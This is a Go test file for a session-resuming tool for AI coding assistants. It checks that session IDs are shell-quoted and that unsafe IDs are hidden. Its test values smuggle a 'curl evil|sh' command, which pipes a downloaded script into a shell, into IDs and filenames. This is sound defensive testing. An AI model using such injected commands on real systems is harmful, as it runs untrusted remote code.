package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestResumeCmdQuotesID(t *testing.T) {
	s := &Session{Tool: "codex", ID: "x; curl https://evil/s|sh", Cwd: "/tmp/p"}
	if got, want := s.ResumeCmd(), `cd /tmp/p && codex resume 'x; curl https://evil/s|sh'`; got != want {
		t.Errorf("ResumeCmd = %s, want %s", got, want)
	}
	s = &Session{Tool: "claude", ID: "0f8e2c1a-1b2c-4d5e-8f90-123456789abc"}
	if got := s.ResumeCmd(); got != "claude --resume 0f8e2c1a-1b2c-4d5e-8f90-123456789abc" {
		t.Errorf("a plain id was quoted: %s", got)
	}
}

func TestSessionIDsAreValidated(t *testing.T) {
	dir := t.TempDir()
	write := func(name, body string) (string, os.FileInfo) {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		fi, _ := os.Stat(p)
		return p, fi
	}
	user := `{"type":"user","message":{"content":"hello"}}` + "\n"
	if s := parseClaude(write("x; curl evil|sh.jsonl", user)); !s.Hidden {
		t.Errorf("claude session with a shell-unsafe id is listed: %q", s.ID)
	}
	if s := parseClaude(write("0f8e2c1a-1b2c-4d5e-8f90-123456789abc.jsonl", user)); s.Hidden || s.FirstPrompt != "hello" {
		t.Errorf("valid claude session: %+v", s)
	}

	const uuid = "0f8e2c1a-1b2c-4d5e-8f90-123456789abc"
	meta := `{"type":"session_meta","payload":{"id":"x; curl evil|sh","cwd":"/tmp"}}` + "\n" +
		`{"type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"hi"}]}}` + "\n"
	s := parseCodex(write("rollout-2026-01-01T00-00-00-"+uuid+".jsonl", meta))
	if s.ID != uuid || s.Hidden || strings.Contains(s.ResumeCmd(), "curl") {
		t.Errorf("codex: bad session_meta id was used: %q hidden=%v", s.ID, s.Hidden)
	}
	if s := parseCodex(write("rollout-short.jsonl", meta)); !s.Hidden {
		t.Errorf("codex session without a usable id is listed: %q", s.ID)
	}
}
